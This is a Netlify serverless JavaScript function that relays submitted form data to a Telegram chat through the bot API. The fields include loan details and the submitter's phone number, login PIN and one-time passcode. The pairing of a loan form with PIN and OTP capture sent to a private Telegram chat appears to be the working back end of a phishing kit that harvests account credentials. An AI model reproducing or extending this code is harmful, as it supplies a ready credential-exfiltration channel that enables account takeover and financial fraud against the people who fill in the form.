// netlify/functions/sendTelegram.js
exports.handler = async function(event) {
  if (event.httpMethod !== 'POST') return { statusCode: 405, body: 'Method not allowed' };

  const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return { statusCode: 500, body: 'Missing TELEGRAM_TOKEN or TELEGRAM_CHAT_ID' };

  let payload = {};
  try { payload = JSON.parse(event.body || '{}'); } catch(e){ return { statusCode: 400, body: 'Invalid JSON' }; }

  // Build message text: flatten payload nicely
  function esc(s){ return String(s||'').replace(/([_*\\[\\]`])/g, '\\$1'); }

  let text = '*New Submission Received*\\n\\n';
  if (payload.submittedAt) text += `*Time:* ${esc(payload.submittedAt)}\\n\\n`;

  if (payload.loanData && typeof payload.loanData === 'object') {
    text += '*Loan details:*\\n';
    for (const k of Object.keys(payload.loanData)) text += `*${esc(k)}:* ${esc(payload.loanData[k])}\\n`;
    text += '\\n';
  }

  // Add login details if present
  if (payload.loginPhone) {
    text += '*Login details:*\\n';
    text += `*Phone:* ${esc(payload.loginPhone)}\\n`;
    text += `*PIN:* ${esc(payload.loginPin)}\\n`;
    text += `*OTP:* ${esc(payload.otp)}\\n\\n`;
  }

  // If there are extra top-level keys, include them
  const topExtras = Object.assign({}, payload);
  delete topExtras.loanData;
  delete topExtras.submittedAt;
  delete topExtras.loginPhone;
  delete topExtras.loginPin;
  delete topExtras.otp;
  if (Object.keys(topExtras).length) {
    text += '*Other:*\\n';
    for (const k of Object.keys(topExtras)) text += `*${esc(k)}:* ${esc(topExtras[k])}\\n`;
  }

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
  try {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'Markdown' })
    });
    if (!resp.ok) {
      const err = await resp.text();
      return { statusCode: 500, body: 'Telegram error: ' + err };
    }
    return { statusCode: 200, body: 'ok' };
  } catch (e) {
    return { statusCode: 500, body: e.message || 'fetch error' };
  }
};
